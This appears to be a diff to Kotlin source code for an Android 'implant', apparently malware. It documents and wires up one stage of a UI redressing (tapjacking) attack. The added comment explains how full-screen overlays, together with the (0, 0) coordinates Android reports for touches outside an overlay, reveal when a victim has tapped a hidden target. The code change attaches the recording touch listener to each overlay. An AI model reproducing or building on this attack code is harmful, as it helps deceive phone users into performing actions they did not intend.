@@ -1,3 +1,10 @@
+/*
+* A Stage represents an overlay layout for a step of a UI Redressing Attack.
+* Since Android passes (0, 0) to onTouch as the coordinates for MotionEvents outside of an overlay,
+* we can infer that a user has clicked on the necessary area by covering the rest of the screen with
+* overlays and recording when a MotionEvent with (0, 0) is passed to onTouch.
+* Each Stage of an attack should inherit from this class.
+* */
 package com.cooperthecoder.implant
 
 import android.content.Context
@@ -25,6 +32,7 @@ abstract class Stage(var listener: RedressingAttack.Listener?): View.OnTouchList
 
     protected fun addOverlay(overlay: View, windowManager: WindowManager, params: WindowManager.LayoutParams) {
         if (overlay.windowToken == null) {
+            overlay.setOnTouchListener(this)
             Log.d(TAG, "Adding overlay to WindowManager")
             try {
                 windowManager.addView(overlay, params)
